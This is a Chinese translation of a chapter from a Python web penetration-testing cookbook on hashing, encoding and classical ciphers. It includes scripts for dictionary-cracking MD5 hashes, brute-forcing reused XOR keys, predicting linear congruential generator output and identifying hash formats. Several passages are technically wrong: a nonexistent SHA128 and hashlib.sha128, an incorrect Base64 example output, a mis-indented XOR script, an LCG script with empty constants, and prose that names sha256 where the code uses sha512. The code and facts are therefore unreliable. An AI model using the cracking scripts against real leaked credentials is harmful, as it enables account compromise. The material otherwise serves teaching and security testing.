# Python Web 渗透测试秘籍（三）

> 原文：[`annas-archive.org/md5/9ECC87991CE5C1AD546C7BAEC6960102`](https://annas-archive.org/md5/9ECC87991CE5C1AD546C7BAEC6960102)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第七章：加密和编码

在本章中，我们将涵盖以下主题：

+   生成 MD5 哈希

+   生成 SHA 1/128/256 哈希

+   同时实现 SHA 和 MD5 哈希

+   在现实场景中实现 SHA

+   生成 Bcrypt 哈希

+   破解 MD5 哈希

+   使用 Base64 编码

+   使用 ROT13 编码

+   破解替换密码

+   破解 Atbash 密码

+   攻击一次性密码重用

+   预测线性同余生成器

+   识别哈希

# 介绍

在本章中，我们将涵盖 Python 世界中的加密和编码。加密和编码是 Web 应用程序中非常重要的两个方面，因此使用 Python 进行它们！

我们将深入了解 MD5 和 SHA 哈希的世界，敲开 Base64 和 ROT13 的大门，并查看一些最流行的哈希和密码。我们还将回到过去，看看一些非常古老的方法以及制作和破解它们的方式。

# 生成 MD5 哈希

MD5 哈希是 Web 应用程序中最常用的哈希之一，因为它们易于使用并且哈希速度快。MD5 哈希是 1991 年发明的，用来取代之前的版本 MD4，至今仍在使用。

## 做好准备

对于此脚本，我们只需要`hashlib`模块。

## 如何做…

在 Python 中生成 MD5 哈希非常简单，这是因为我们可以导入的模块的性质。我们需要定义要导入的模块，然后决定要对哪个字符串进行哈希。我们应该将其硬编码到脚本中，但这意味着每次需要对新字符串进行哈希时都必须修改脚本。

相反，我们使用 Python 中的`raw_input`功能询问用户要输入的字符串：

```py
import hashlib
message = raw_input("Enter the string you would like to hash: ")
md5 = hashlib.md5(message.encode())
print (md5.hexdigest())
```

## 工作原理…

`hashlib`模块在幕后为我们做了大部分工作。Hashlib 是一个庞大的库，可以让用户非常快速和轻松地对 MD5、SHA1、SHA256 和 SHA512 等进行哈希。这就是使用该模块的原因。

我们首先使用标准方法导入模块：

```py
import hashlib
```

然后我们需要要对 MD5 进行编码的字符串。如前所述，这可以硬编码到脚本中，但这并不是非常实用。解决方法是使用`raw_input`功能向用户询问输入。可以通过以下方式实现：

```py
message = raw_input("Enter what you wish to ask the user here: ")
```

一旦我们有了输入，我们可以继续使用 hashlib 的内置函数对字符串进行编码。为此，在定义要使用的字符串之后，我们只需调用`.encode()`函数：

```py
md5 = hashlib.md5(message.encode())
```

最后，我们可以打印使用`.hexdigest()`函数的字符串的输出。如果不使用`hexdigest`，则会打印每个字节的十六进制表示。

以下是脚本的完整示例：

```py
Enter the string you would like to hash: pythonrules
048c0fc556088fabc53b76519bfb636e

```

# 生成 SHA 1/128/256 哈希

SHA 哈希与 MD5 哈希一样非常常用。SHA 哈希的早期实现始于 SHA1，由于哈希的弱点，现在使用较少。SHA1 之后是 SHA128，然后被 SHA256 取代。

## 做好准备

对于这些脚本，我们将再次只需要`hashlib`模块。

## 如何做…

在 Python 中生成 SHA 哈希也非常简单，只需使用导入的模块。通过简单的调整，我们可以更改是否要生成 SHA1、SHA128 或 SHA256 哈希。

以下是三个不同的脚本，允许我们生成不同的 SHA 哈希：

以下是 SHA1 的脚本：

```py
import hashlib
message = raw_input("Enter the string you would like to hash: ")
sha = hashlib.sha1(message)
sha1 = sha.hexdigest()
print sha1
```

以下是 SHA128 的脚本：

```py
import hashlib
message = raw_input("Enter the string you would like to hash: ")
sha = hashlib.sha128(message)
sha128 = sha.hexdigest()
print sha128
```

以下是 SHA256 的脚本：

```py
import hashlib
message = raw_input("Enter the string you would like to hash: ")
sha = hashlib.sha256(message)
sha256 = sha.hexdigest()
print sha256
```

## 工作原理…

`hashlib`模块再次为我们做了大部分工作。我们可以利用模块内的功能。

我们通过使用以下方法导入模块开始：

```py
import hashlib
```

然后我们需要提示输入要使用 SHA 进行编码的字符串。我们要求用户输入而不是使用硬编码，这样脚本就可以一遍又一遍地使用。可以通过以下方式实现：

```py
message = raw_input("Enter the string you would like to hash: )
```

一旦我们有了字符串，就可以开始编码过程。接下来的部分取决于您想要使用的 SHA 编码：

```py
sha = hashlib.sha*(message)
```

我们需要用`*`替换为`1`、`128`或`256`。一旦我们对消息进行了 SHA 编码，我们需要再次使用`hexdigest()`函数，以便输出变得可读。

我们用以下方式实现：

```py
sha*=sha.hexdigest()
```

一旦输出变得可读，我们只需要打印哈希输出：

```py
print sha*
```

# 实现 SHA 和 MD5 哈希的结合

在这一部分，我们将看到 SHA 和 MD5 哈希是如何一起工作的。

## 准备工作

对于下面的脚本，我们只需要`hashlib`模块。

## 如何做…

我们将把之前做过的所有东西联系在一起形成一个大脚本。这将输出三个版本的 SHA 哈希和一个 MD5 哈希，所以用户可以选择使用哪一个：

```py
import hashlib

message = raw_input("Enter the string you would like to hash: ")

md5 = hashlib.md5(message)
md5 = md5.hexdigest()

sha1 = hashlib.sha1(message)
sha1 = sha1.hexdigest()

sha256 = hashlib.sha256(message)
sha256 = sha256.hexdigest()

sha512 = hashlib.sha512(message)
sha512 = sha512.hexdigest()

print "MD5 Hash =", md5
print "SHA1 Hash =", sha1
print "SHA256 Hash =", sha256
print "SHA512 Hash =", sha512
print "End of list."
```

## 它是如何工作的…

再次，在将正确的模块导入到此脚本之后，我们需要接收用户输入，将其转换为编码字符串：

```py
import hashlib
message = raw_input('Please enter the string you would like to hash: ')
```

从这里开始，我们可以开始将字符串通过所有不同的编码方法，并确保它们通过`hexdigest()`，以便输出变得可读：

```py
md5 = hashlib.md5(message)
md5 = md5.hexdigest()

sha1 = hashlib.sha1(message)
sha1 = sha1.hexdigest()

sha256 = hashlib.sha256(message)
sha256 = sha256.hexdigest()

sha512 = hashlib.sha512(message)
sha512 = sha512.hexdigest()
```

一旦我们创建了所有的编码字符串，只需将每个字符串打印给用户即可：

```py
print "MD5 Hash =", md5
print "SHA1 Hash =", sha1
print "SHA256 Hash =", sha256
print "SHA512 Hash =", sha512
print "End of list."
```

这是脚本运行的一个示例：

```py
Enter the string you would like to hash: test
MD5 Hash = 098f6bcd4621d373cade4e832627b4f6
SHA1 Hash= a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
SHA256 Hash= 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
SHA512 Hash= ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0 db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff
End of list.

```

# 在真实世界的场景中实现 SHA

以下是真实 SHA 实现的示例。

## 准备工作

对于这个脚本，我们将需要`hashlib`库和`uuid`库。

## 如何做…

对于这个真实世界的示例，我们将实现一个 SHA256 编码方案，并生成一个盐，使其更加安全，以防止预先计算的哈希表。然后我们将通过密码检查来确保密码被正确输入：

```py
#!/usr/bin/python
import uuid
import hashlib

# Let's do the hashing. We create a salt and append it to the password once hashes.

def hash(password):
    salt = uuid.uuid4().hex
    return hashlib.sha512(salt.encode() + password.encode()).hexdigest() + ':' + salt

# Let's confirm that worked as intended.

def check(hashed, p2):
    password, salt = hashed.split(':')
    return password == hashlib.sha512(salt.encode() + p2.encode()).hexdigest()

password = raw_input('Please enter a password: ')
hashed = hash(password)
print('The string to store in the db is: ' + hashed)
re = raw_input('Please re-enter your password: ')

# Let's ensure the passwords matched

if check(hashed, re):
    print('Password Match')
else:
    print('Password Mismatch')
```

## 它是如何工作的…

开始脚本之前，我们需要导入正确的库：

```py
import uuid
import hashlib
```

然后我们需要定义将哈希密码的函数。我们首先创建一个盐，使用`uuid`库。一旦盐被生成，我们使用`hashlib.sha256`将盐编码和密码编码串在一起，并使用`hexdigest`使其可读，最后将盐附加到末尾：

```py
def hash(password):
    salt = uuid.uuid4().hex
    return hashlib.sha512(salt.encode() + password.encode()).hexdigest() + ':' + salt
```

接下来，我们转向检查密码函数。这将确认我们的原始密码与第二个密码相同，以确保没有错误。这是通过使用与之前相同的方法来完成的：

```py
def check(hashed, p2):
    password, salt = hashed.split(':')
    return password == hashlib.sha512(salt.encode() + p2.encode()).hexdigest()
```

一旦我们创建了所需的代码块，我们可以开始要求用户输入所需的输入。我们首先要求原始密码，并使用`hash_password`函数创建哈希。然后将其打印给用户。完成第一个密码后，我们再次要求输入密码，以确保没有拼写错误。`check_password`函数然后再次对密码进行哈希并将原始密码与新密码进行比较。如果匹配，用户将被告知密码是正确的；如果不匹配，用户将被告知密码不匹配：

```py
password = raw_input('Please enter a password: ')
hashed = hash(password)
print('The string to store in the db is: ' + hashed)
re = raw_input('Please re-enter your password: ')
if check(hashed, re):
    print('Password Match')
else:
    print('Password Mismatch')
```

这是代码的一个使用示例：

```py
Please enter a password: password
The string to store in the db is: a8be1e0e023e2c9c1e96187c4b966222ccf1b7d34718ad60f8f000094d39 d8dd3eeb837af135bfe50c7baea785ec735ed04f230ffdbe2ed3def1a240c 97ca127:d891b46fc8394eda85ccf85d67969e82
Please re-enter your password: password
Password Match

```

上面的结果是一个用户两次输入相同密码的示例。这是一个用户未能输入相同密码的示例：

```py
Please enter a password: password1
The string to store in the db is: 418bba0beeaef52ce523dafa9b19baa449562cf034ebd1e4fea8c007dd49cb 1004e10b837f13d59b13236c54668e44c9d0d8dbd03e32cd8afad6eff04541 ed07:1d9cd2d9de5c46068b5c2d657ae45849
Please re-enter your password: password
Password Mismatch

```

# 生成 Bcrypt 哈希

其中一个不太常用但更安全的哈希函数是**Bcrypt**。Bcrypt 哈希被设计为在加密和解密哈希时速度较慢。这种设计用于防止哈希泄露到公共场合时容易被破解，例如从数据库泄露。

## 准备工作

对于这个脚本，我们将在 Python 中使用`bcrypt`模块。这可以通过`pip`或`easy_install`安装，但是您需要确保安装的是版本 0.4 而不是版本 1.1.1，因为版本 1.1.1 删除了`Bcrypt`模块的一些功能。

## 如何做…

在 Python 中生成 Bcrypt 散列与生成其他散列（如 SHA 和 MD5）类似，但也略有不同。与其他散列一样，我们可以提示用户输入密码，也可以将其硬编码到脚本中。Bcrypt 中的哈希更复杂，因为使用了随机生成的盐，这些盐被附加到原始哈希中。这增加了哈希的复杂性，因此增加了哈希函数中存储的密码的安全性。

该脚本还在最后有一个`checking`模块，与现实世界的例子有关。它要求用户重新输入他们想要哈希的密码，并确保与原始输入匹配。密码确认是许多开发人员的常见做法，在现代，几乎每个注册表单都使用这种方法：

```py
import bcrypt
# Let's first enter a password
new = raw_input('Please enter a password: ')
# We'll encrypt the password with bcrypt with the default salt value of 12
hashed = bcrypt.hashpw(new, bcrypt.gensalt())
# We'll print the hash we just generated
print('The string about to be stored is: ' + hashed)
# Confirm we entered the correct password
plaintext = raw_input('Please re-enter the password to check: ')
# Check if both passwords match
if bcrypt.hashpw(plaintext, hashed) == hashed:
    print 'It\'s a match!'
else:
    print 'Please try again.'
```

## 工作原理…

我们首先通过导入所需的模块来启动脚本。在这种情况下，我们只需要`bcrypt`模块：

```py
import bcrypt
```

然后我们可以使用标准的`raw_input`方法从用户那里请求输入：

```py
new = raw_input('Please enter a password: ')
```

在我们有了输入之后，我们可以开始使用详细的哈希方法。首先，我们使用`bcrypt.hashpw`函数对输入进行哈希处理。然后我们给它输入的密码的值，然后还随机生成一个盐，使用`bcrypt.gensalt()`。这可以通过使用以下方式实现：

```py
hashed = bcrypt.hashpw(new, bcrypt.gensalt())
```

然后我们将散列值打印给用户，这样他们就可以看到生成的散列值：

```py
print ('The string about to be stored is: ' + hashed)
```

现在，我们开始密码确认。我们必须提示用户再次输入密码，以便我们确认他们输入正确：

```py
plaintext = raw_input('Please re-enter the password to check: ')
```

一旦我们有了密码，我们可以使用 Python 中的`==`功能来检查两个密码是否匹配：

```py
If bcrypt.hashpw(plaintext, hashed) == hashed:
  print "It\'s a match"
else:
  print "Please try again".
```

我们可以看到脚本的运行情况如下：

```py
Please enter a password: example
The string about to be stored is: $2a$12$Ie6u.GUpeO2WVjchYg7Pk.741gWjbCdsDlINovU5yubUeqLIS1k8e
Please re-enter the password to check: example
It's a match!

Please enter a password: example
The string about to be stored is: $2a$12$uDtDrVCv2vqBw6UjEAYE8uPbfuGsxdYghrJ/YfkZuA7vaMvGIlDGe
Please re-enter the password to check: incorrect
Please try again.

```

# 破解 MD5 散列

由于 MD5 是一种加密方法并且是公开可用的，因此可以使用常见的破解散列方法来创建散列冲突。这反过来“破解”了散列，并向您返回在经过 MD5 处理之前的字符串的值。这最常见的是通过“字典”攻击来实现的。这包括将一系列单词通过 MD5 编码过程并检查它们是否与您尝试破解的 MD5 散列匹配。这是因为如果散列相同，则 MD5 散列始终相同。

## 准备工作

对于这个脚本，我们只需要`hashlib`模块。

## 如何做…

要开始破解 MD5 散列，我们需要加载一个包含要在 MD5 中加密的单词列表的文件。这将允许我们循环遍历散列并检查是否有匹配：

```py
import hashlib
target = raw_input("Please enter your hash here: ")
dictionary = raw_input("Please enter the file name of your dictionary: ")
def main():
    with open(dictionary) as fileobj:
        for line in fileobj:
            line = line.strip()
            if hashlib.md5(line).hexdigest() == target:
                print "Hash was successfully cracked %s: The value is %s" % (target, line)
                return ""
    print "Failed to crack the file."
if __name__ == "__main__":
    main()
```

## 工作原理…

我们首先像平常一样将模块加载到 Python 中：

```py
import hashlib
```

我们需要用户输入要破解的散列以及我们要加载以破解的字典的名称：

```py
target = raw_input("Please enter your hash here: ")
dictionary = raw_input("Please enter the file name of your dictionary: ")
```

一旦我们有了要破解的散列和字典，我们就可以继续进行编码。我们需要打开`dictionary`文件并逐个对每个字符串进行编码。然后我们可以检查是否有任何散列与我们要破解的原始散列匹配。如果有匹配，我们的脚本将通知我们并给出值：

```py
def main():
    with open(dictionary) as fileobj:
        for line in fileobj:
            line = line.strip()
            if hashlib.md5(line).hexdigest() == target:
                print "Hash was successfully cracked %s: The value is %s" % (target, line)
                return ""
    print "Failed to crack the file."
```

现在剩下的就是运行程序：

```py
if __name__ == "__main__":
    main()
```

现在让我们看看脚本的运行情况：

```py
Please enter your hash here: 5f4dcc3b5aa765d61d8327deb882cf99
Please enter the file name of your dictionary: dict.txt
Hash was successfully cracked 5f4dcc3b5aa765d61d8327deb882cf99: The value is password

```

# 使用 Base64 进行编码

Base64 是一种经常使用的编码方法。它非常容易编码和解码，这使得它既非常有用又危险。Base64 不再常用于编码敏感数据，但曾经有过这样的时期。

## 准备工作

值得庆幸的是，对于 Base64 编码，我们不需要任何外部模块。

## 如何做…

要生成 Base64 编码的字符串，我们可以使用默认的 Python 功能来帮助我们实现它：

```py
#!/usr/bin/python
msg = raw_input('Please enter the string to encode: ')
print "Your B64 encoded string is: " + msg.encode('base64')
```

## 工作原理…

在 Python 中对字符串进行 Base64 编码非常简单，可以在两行脚本中完成。首先，我们需要将字符串作为用户输入提供给我们，这样我们就有了可以使用的东西：

```py
msg = raw_input('Please enter the string to encode: ')
```

一旦我们有了字符串，我们可以在打印出结果时进行编码，使用`msg.encode('base64')`：

```py
print "Your B64 encoded string is: " + msg.encode('base64')
```

以下是脚本运行的示例：

```py
Please enter the string to encode: This is an example
Your B64 encoded string is: VghpcyBpcyBhbiBleGFtcGxl

```

# 使用 ROT13 编码

ROT13 编码绝对不是编码任何东西的最安全方法。通常，ROT13 多年前被用来隐藏论坛上的冒犯性笑话，作为一种**不适宜工作**（**NSFW**）标记，以便人们不会立即看到这个评论。如今，它主要用于**夺旗**（**CTF**）挑战，你会发现原因的。

## 准备工作

对于这个脚本，我们将需要非常具体的模块。我们将需要`maketrans`功能，以及来自`string`模块的小写和大写功能。

## 如何做…

要使用 ROT13 编码方法，我们需要复制 ROT13 密码实际执行的操作。13 表示每个字母将沿字母表移动 13 个位置，这使得编码非常容易逆转：

```py
from string import maketrans, lowercase, uppercase
def rot13(message):
   lower = maketrans(lowercase, lowercase[13:] + lowercase[:13])
   upper = maketrans(uppercase, uppercase[13:] + uppercase[:13])
   return message.translate(lower).translate(upper)
message = raw_input('Enter :')
print rot13(message)
```

## 它是如何工作的…

这是我们的脚本中第一个不仅仅需要`hashlib`模块的脚本；而是需要字符串的特定功能。我们可以使用以下导入这些：

```py
from string import maketrans, lowercase, uppercase
```

接下来，我们可以创建一个代码块来为我们进行编码。我们使用 Python 的`maketrans`功能告诉解释器将字母移动 13 个位置，并保持大写和小写。然后我们要求它将值返回给我们：

```py
def rot13(message):
   lower = maketrans(lowercase, lowercase[13:] + lowercase[:13])
   upper = maketrans(uppercase, uppercase[13:] + uppercase[:13])
   return message.translate(lower).translate(upper)
```

然后我们需要询问用户输入一些内容，这样我们就有一个字符串可以使用；这是以传统方式完成的：

```py
message = raw_input('Enter :')
```

一旦我们有了用户输入，我们就可以打印出我们的字符串通过我们的`rot13`代码块传递的值：

```py
print rot13(message)
```

以下是代码使用的示例：

```py
Enter :This is an example of encoding in Python
Guvf vf na rknzcyr bs rapbqvat va Clguba

```

# 破解替换密码

以下是最近遇到的一个真实场景的示例。替换密码是指用其他字母替换字母以形成新的隐藏消息。在由"NullCon"主办的 CTF 中，我们遇到了一个看起来像替换密码的挑战。挑战是：

找到密钥：

```py
TaPoGeTaBiGePoHfTmGeYbAtPtHoPoTaAuPtGeAuYbGeBiHoTaTmPtHoTmGePoAuGe ErTaBiHoAuRnTmPbGePoHfTmGeTmRaTaBiPoTmPtHoTmGeAuYbGeTbGeLuTmPtTm PbTbOsGePbTmTaLuPtGeAuYbGeAuPbErTmPbGeTaPtGePtTbPoAtPbTmGeTbPtEr GePoAuGeYbTaPtErGePoHfTmGeHoTbAtBiTmBiGeLuAuRnTmPbPtTaPtLuGePoHf TaBiGeAuPbErTmPbPdGeTbPtErGePoHfTaBiGePbTmYbTmPbBiGeTaPtGeTmTlAt TbOsGeIrTmTbBiAtPbTmGePoAuGePoHfTmGePbTmOsTbPoTaAuPtBiGeAuYbGeIr TbPtGeRhGeBiAuHoTaTbOsGeTbPtErGeHgAuOsTaPoTaHoTbOsGeRhGeTbPtErGePoAuGePoHfTmGeTmPtPoTaPbTmGeAtPtTaRnTmPbBiTmGeTbBiGeTbGeFrHfAuOs TmPd
```

## 准备工作

对于这个脚本，不需要任何外部库。

## 如何做…

为了解决这个问题，我们将我们的字符串与我们的周期字典中的值进行匹配，并将发现的值转换为它们的 ascii 形式。这样就返回了我们最终答案的输出：

```py
string = "TaPoGeTaBiGePoHfTmGeYbAtPtHoPoTaAuPtGeAuYbGeBiHoTaTmPtHoTmGePoA uGeErTaBiHoAuRnTmPbGePoHfTmGeTmRaTaBiPoTmPtHoTmGeAuYbGeTbGeLuTmP tTmPbTbOsGePbTmTaLuPtGeAuYbGeAuPbErTmPbGeTaPtGePtTbPoAtPbTmGeTbP tErGePoAuGeYbTaPtErGePoHfTmGeHoTbAtBiTmBiGeLuAuRnTmPbPtTaPtLuGeP oHfTaBiGeAuPbErTmPbPdGeTbPtErGePoHfTaBiGePbTmYbTmPbBiGeTaPtGeTmT lAtTbOsGeIrTmTbBiAtPbTmGePoAuGePoHfTmGePbTmOsTbPoTaAuPtBiGeAuYbG eIrTbPtGeRhGeBiAuHoTaTbOsGeTbPtErGeHgAuOsTaPoTaHoTbOsGeRhGeTbPtE rGePoAuGePoHfTmGeTmPtPoTaPbTmGeAtPtTaRnTmPbBiTmGeTbBiGeTbGeFrHfA uOsTmPd"

n=2
list = []
answer = []

[list.append(string[i:i+n]) for i in range(0, len(string), n)]

print set(list)

periodic ={"Pb": 82, "Tl": 81, "Tb": 65, "Ta": 73, "Po": 84, "Ge": 32, "Bi": 83, "Hf": 72, "Tm": 69, "Yb": 70, "At": 85, "Pt": 78, "Ho": 67, "Au": 79, "Er": 68, "Rn": 86, "Ra": 88, "Lu": 71, "Os": 76, "Tl": 81, "Pd": 46, "Rh": 45, "Fr": 87, "Hg": 80, "Ir": 77}

for value in list:
    if value in periodic:
        answer.append(chr(periodic[value]))

lastanswer = ''.join(answer)
print lastanswer
```

## 它是如何工作的…

要启动这个脚本，我们首先在脚本中定义了`key`字符串。然后定义了`n`变量为`2`以供以后使用，并创建了两个空列表—list 和 answer：

```py
string = --snipped--
n=2
list = []
answer = []
```

然后我们开始创建列表，它通过字符串并提取两个字母的集合并将它们附加到列表值，然后打印出来：

```py
[list.append(string[i:i+n]) for i in range(0, len(string), n)]
print set(list)
```

这两个字母分别对应于周期表中的一个值，这与一个数字相关。当这些数字转换为 ascii 相关的字符时。一旦发现了这一点，我们需要将元素映射到它们的周期数，并存储起来：

```py
periodic ={"Pb": 82, "Tl": 81, "Tb": 65, "Ta": 73, "Po": 84, "Ge": 32, "Bi": 83, "Hf": 72, "Tm": 69, "Yb": 70, "At": 85, "Pt": 78, "Ho": 67, "Au": 79, "Er": 68, "Rn": 86, "Ra": 88, "Lu": 71, "Os": 76, "Tl": 81, "Pd": 46, "Rh": 45, "Fr": 87, "Hg": 80, "Ir": 77}
```

然后我们可以创建一个循环，它将遍历我们之前创建并命名为**list**的元素列表，并将它们映射到我们创建的`periodic`数据集中的值。在运行时，我们可以让它将发现附加到我们的答案字符串中，同时将 ascii 数字转换为相关字母：

```py
for value in list:
    if value in periodic:
        answer.append(chr(periodic[value]))
```

最后，我们需要将数据打印出来：

```py
lastanswer = ''.join(answer)
print lastanswer
```

以下是脚本运行的示例：

```py
set(['Pt', 'Pb', 'Tl', 'Lu', 'Ra', 'Pd', 'Rn', 'Rh', 'Po', 'Ta', 'Fr', 'Tb', 'Yb', 'Bi', 'Ho', 'Hf', 'Hg', 'Os', 'Ir', 'Ge', 'Tm', 'Au', 'At', 'Er'])
IT IS THE FUNCTION OF SCIENCE TO DISCOVER THE EXISTENCE OF A GENERAL REIGN OF ORDER IN NATURE AND TO FIND THE CAUSES GOVERNING THIS ORDER. AND THIS REFERS IN EQUAL MEASURE TO THE RELATIONS OF MAN - SOCIAL AND POLITICAL - AND TO THE ENTIRE UNIVERSE AS A WHOLE.

```

# 破解 Atbash 密码

Atbash 密码是一种简单的密码，它使用字母表中的相反值来转换单词。例如，A 等于 Z，C 等于 X。

## 准备工作

对此，我们只需要`string`模块。

## 如何做…

由于 Atbash 密码是通过使用字母表中字符的相反值来工作的，我们可以创建一个`maketrans`功能来替换字符：

```py
import string
input = raw_input("Please enter the value you would like to Atbash Cipher: ")
transform = string.maketrans(
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba")
final = string.translate(input, transform)
print final
```

## 它是如何工作的…

导入正确的模块后，我们要求用户输入他们想要加密到 Atbash 密码中的值：

```py
import string
input = raw_input("Please enter the value you would like to Atbash Ciper: ")
```

接下来，我们创建要使用的`maketrans`功能。我们通过列出我们想要替换的第一组字符，然后列出另一组用于替换前一组的字符来实现这一点：

```py
transform = string.maketrans(
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba")
```

最后，我们只需要给转换一个值，应用它，并打印出值以获得最终结果：

```py
final = string.translate(input, transform)
print final
```

以下是脚本的示例：

```py
Please enter the value you would like to Atbash Cipher: testing
gvhgrmt

```

# 攻击一次性密码重用

一次性密码的概念是早期密码学的基本核心。基本上，各方记住一个短语，当发送消息时，对每一步都用该短语进行移位。例如，如果短语是`apple`，消息是`i like them`，那么我们将`a`加到`i`上得到`j`，以此类推，最终得到编码后的消息。

最近，许多恶意软件工程师和糟糕的软件工程师使用 XOR 来执行相同的活动。当漏洞存在且我们可以创建有用的脚本的地方是，同一个密钥已被多次使用。如果多个基于 ASCII 的字符串已经与相同的基于 ASCII 的字符串进行了 XOR 运算，我们可以通过逐个字符地将它们与 ASCII 值进行 XOR 运算来同时破解这些字符串。

以下脚本将逐个字符地对文件中的 XOR 值列表进行暴力破解。

## 准备工作

将 XOR 短语列表放入一个文件中。将该文件放在与您的脚本相同的文件夹中（或者不放；如果放了，它只会让事情稍微变得容易一点）。

## 如何做…

脚本应该看起来像这样：

```py
import sys
import string

f = open("ciphers.txt", "r")

MSGS = f.readlines()

def strxor(a, b):  
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

def encrypt(key, msg):
    c = strxor(key, msg)
    return c

for msg in MSGS:
for value in string.ascii_letters:
for value2 in string.ascii_letters:
  for value3 in string.ascii_letters:
key = value+value2+value3
answer = encrypt(msg, key)
print answer[3:]
```

## 它是如何工作的…

这个脚本非常简单。我们打开一个包含 XOR 值的文件，并按行拆分它：

```py
f = open("ciphers.txt", "r")

MSGS = f.readlines()
```

我们无耻地使用了行业标准的`XOR` python。基本上，这个函数将两个字符串等长地等同起来，然后将它们进行`XOR`运算：

```py
def strxor(a, b):  
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

def encrypt(key, msg):
    c = strxor(key, msg)
    return c
```

然后，我们运行所有 ASCII 值三次，以获取`ciphers.txt`文件中每行的`aaa`到`zzz`的所有组合。我们每次将 ASCII 循环的值分配给密钥：

```py
for msg in MSGS:
for value in string.ascii_letters:
for value2 in string.ascii_letters:
  for value3 in string.ascii_letters:
key = value+value2+value3
```

然后，我们用生成的密钥加密该行并将其打印出来。我们可以轻松地将其导入文件，就像我们在整本书中已经展示的那样：

```py
answer = encrypt(msg, key)
print answer[3:]
```

# 预测线性同余生成器

LCG 被用于网络应用程序中创建快速和简单的伪随机数。它们天生就是不安全的，只要有足够的数据，就可以很容易地预测。LCG 的算法是：

![预测线性同余生成器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_07_01.jpg)

在这里，**X**是当前值，**a**是固定的乘数，**c**是固定的增量，**m**是固定的模数。如果泄漏了任何数据，例如本例中的乘数、模数和增量，就有可能计算出种子，从而计算出下一个值。

## 准备工作

这里的情况是一个应用程序生成随机的两位数并将它们返回给你。你知道乘数、模数和增量。这可能看起来很奇怪，但这在实际测试中确实发生过。

## 如何做…

以下是代码：

```py
C = ""
A = ""
M = ""

print "Starting attempt to brute"

for i in range(1, 99999999):
    a = str((A * int(str(i)+'00') + C) % 2**M)
    if a[-2:] == "47":
        b = str((A * int(a) + C) % 2**M)
        if b[-2:] == "46":
            c = str((A * int(b) + C) % 2**M)
            if c[-2:] == "57":
                d = str((A * int(c) + C) % 2**M)
                if d[-2:] == "56":
                    e = str((A * int(d) + C) % 2**M)
                    if e[-2:] == "07":
                        f = str((A * int(e) + C) % 2**M)
                        if f[-2:] == "38":
                            g = str((A * int(f) + C) % 2**M)
                            if g[-2:] == "81":
                                h = str((A * int(g) + C) % 2**M)
                                if h[-2:] == "32":
                                    j = str((A * int(h) + C) % 2**M)
                                    if j[-2:] == "19":
                                        k = str((A * int(j) + C) % 2**M)
                                        if k[-2:] == "70":
                                            l = str((A * int(k) + C) % 2**M)
                                            if l[-2:] == "53":
                                                print "potential number found: "+l
print "next 9 values are:"
for i in range(1, 10):
    l = str((A * int(l) + C) % 2**M)
    print l[-2:]
```

## 它是如何工作的…

我们设置了三个值，增量、乘数和模数分别为`C`、`A`和`M`：

```py
C = ""
A = ""
M = ""
```

然后，我们声明种子可能的大小范围，本例中为 1 到 8 位数字：

```py
for i in range(1, 99999999):
```

然后，我们执行第一个 LCG 转换，并使用网页上标记的第一个值生成可能的值，如下例所示：

```py
a = str((A * int(str(i)+'00') + C) % 2**M)
```

我们取得网页生成的第二个值，并检查这个转换的结果是否与之相匹配：

```py
    if a[-2:] == "47":
```

如果成功，我们就用与第一个转换匹配的数字执行下一个转换：

```py
        b = str((A * int(a) + C) % 2**M)
```

我们在这里重复这个过程 10 次，但可以根据需要重复多次，直到找到一个与迄今为止所有数字都匹配的输出。我们打印一个带有该数字的警报：

```py
print "potential number found: "+l
```

然后，我们重复这个过程 10 次，以该数字作为种子生成下一个 10 个值，以便我们预测新值。

# 识别哈希

你使用的几乎每个网络应用程序都应该以某种形式以哈希格式存储你的密码，以增加安全性。对于用户密码来说，一个良好的哈希系统可以在数据库被盗时非常有用，因为这将延长黑客破解密码所需的时间。

出于这个原因，我们有许多不同的哈希方法，其中一些在不同的应用程序中被重复使用，比如 MD5 和 SHA 哈希，但一些如 Des(UNIX)则较少见。因此，能够将哈希值与其所属的哈希函数进行匹配是一个好主意。我们不能仅仅基于哈希长度来进行匹配，因为许多哈希函数具有相同的长度，因此为了帮助我们，我们将使用**正则表达式**（**Regex**）。这允许我们定义长度、使用的字符以及是否存在任何数字值。

## 准备工作

对于这个脚本，我们将只使用`re`模块。

## 如何做…

如前所述，我们将围绕正则表达式值构建脚本，并使用这些值将输入哈希映射到存储的哈希值。这将允许我们非常快速地挑选出哈希的潜在匹配项：

```py
import re
def hashcheck (hashtype, regexstr, data):
    try:
        valid_hash = re.finditer(regexstr, data)
        result = [match.group(0) for match in valid_hash]
        if result: 
            return "This hash matches the format of: " + hashtype
    except: pass
string_to_check = raw_input('Please enter the hash you wish to check: ')
hashes = (
("Blowfish(Eggdrop)", r"^\+[a-zA-Z0-9\/\.]{12}$"),
("Blowfish(OpenBSD)", r"^\$2a\$[0-9]{0,2}?\$[a-zA-Z0- 9\/\.]{53}$"),
("Blowfish crypt", r"^\$2[axy]{0,1}\$[a-zA-Z0-9./]{8}\$[a-zA-Z0- 9./]{1,}$"),
("DES(Unix)", r"^.{0,2}[a-zA-Z0-9\/\.]{11}$"),
("MD5(Unix)", r"^\$1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
